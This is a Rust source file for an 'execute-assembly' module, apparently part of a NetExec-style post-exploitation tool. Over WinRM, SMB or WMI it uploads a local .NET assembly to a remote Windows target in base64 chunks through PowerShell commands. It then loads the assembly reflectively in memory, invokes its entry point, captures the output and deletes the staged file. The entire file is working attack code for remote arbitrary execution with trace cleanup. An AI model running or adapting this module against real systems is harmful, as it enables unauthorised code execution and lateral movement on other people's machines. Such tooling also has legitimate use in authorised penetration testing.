//! # execute_assembly — In-Memory .NET Execution Module
//!
//! Executes a local .NET assembly in memory on the target by uploading it in chunks
//! and reflecting it via PowerShell.

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use base64::{engine::general_purpose, Engine};
use nxc_protocols::{NxcProtocol, NxcSession};
use std::fs;
use tracing::info;
use uuid::Uuid;

pub struct ExecuteAssembly;

impl ExecuteAssembly {
    pub fn new() -> Self {
        Self
    }

    // Fallback to instantiate the right protocol instance based on the session strings
    // In a cleaner architect, the `NxcSession` would hold a reference, but we can recreate it.
    fn get_protocol(&self, session: &dyn NxcSession) -> Result<Box<dyn NxcProtocol>> {
        match session.protocol() {
            "winrm" => Ok(Box::new(nxc_protocols::winrm::WinrmProtocol::new())),
            "smb" => Ok(Box::new(nxc_protocols::smb::SmbProtocol::new())),
            "wmi" => Ok(Box::new(nxc_protocols::wmi::WmiProtocol::new())),
            _ => {
                Err(anyhow!("Protocol {} is not supported by execute-assembly", session.protocol()))
            }
        }
    }
}

impl Default for ExecuteAssembly {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for ExecuteAssembly {
    fn name(&self) -> &'static str {
        "execute-assembly"
    }

    fn description(&self) -> &'static str {
        "Execute a local .NET assembly in memory on the remote target"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["winrm", "smb", "wmi"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "ASSEMBLY".into(),
                description: "Local path to the .NET executable".into(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "ARGS".into(),
                description: "Arguments to pass to the assembly".into(),
                required: false,
                default: Some("".into()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let assembly_path =
            opts.get("ASSEMBLY").ok_or_else(|| anyhow!("ASSEMBLY option is required"))?;
        let args = opts.get("ARGS").unwrap_or(&String::new()).to_string();

        info!("ExecuteAssembly: Reading local assembly {}", assembly_path);
        let file_bytes = fs::read(assembly_path)?;
        let b64_payload = general_purpose::STANDARD.encode(&file_bytes);

        info!("ExecuteAssembly: Assembly encoded down to {} bytes", b64_payload.len());

        let protocol = self.get_protocol(session)?;

        // Target temp file
        let file_id = Uuid::new_v4().simple().to_string();
        let target_file = format!("C:\\Windows\\Temp\\{file_id}.b64");

        info!("ExecuteAssembly: Uploading payload to {} in chunks...", target_file);

        // Chunk size: 4000 characters to be safe for command limits on cmd.exe (smbexec) or WinRM limits
        let chunk_size = 4000;
        let total_chunks = b64_payload.len().div_ceil(chunk_size);

        for (i, chunk) in b64_payload.as_bytes().chunks(chunk_size).enumerate() {
            let chunk_str = std::str::from_utf8(chunk).unwrap_or_else(|_| panic!("invalid utf-8"));
            let cmd = format!(
                "powershell -c \"Add-Content -Path '{target_file}' -Value '{chunk_str}' -NoNewline\""
            );
            protocol.execute(session, &cmd).await?;
            if (i + 1) % 10 == 0 || (i + 1) == total_chunks {
                info!("ExecuteAssembly: Uploaded chunk {}/{}", i + 1, total_chunks);
            }
        }

        info!("ExecuteAssembly: Upload complete. Executing assembly reflectively...");

        // Convert args string to powershell array format: "arg1", "arg2"
        let ps_args = if args.is_empty() {
            "$null".to_string()
        } else {
            let parts: Vec<&str> = args.split_whitespace().collect();
            let formatted_parts: Vec<String> = parts.iter().map(|p| format!("'{p}'")).collect();
            format!("@({})", formatted_parts.join(", "))
        };

        // Execution payload
        let exec_script = format!(
            "$data = [System.IO.File]::ReadAllText('{target_file}'); \
             $bytes = [System.Convert]::FromBase64String($data); \
             $asm = [System.Reflection.Assembly]::Load($bytes); \
             $out = [System.IO.StringWriter]::new(); \
             $oldOut = [System.Console]::Out; \
             [System.Console]::SetOut($out); \
             $asm.EntryPoint.Invoke($null, [object[]] @({ps_args})); \
             [System.Console]::SetOut($oldOut); \
             $out.ToString(); \
             Remove-Item -Path '{target_file}' -Force"
        );

        let exec_cmd = format!("powershell -c \"{exec_script}\"");
        let output = protocol.execute(session, &exec_cmd).await?;

        Ok(ModuleResult {
            credentials: vec![],
            success: output.exit_code.unwrap_or(0) == 0,
            output: output.stdout.clone(),
            data: serde_json::json!({
                "stdout": output.stdout,
                "stderr": output.stderr,
                "exit_code": output.exit_code,
            }),
        })
    }
}
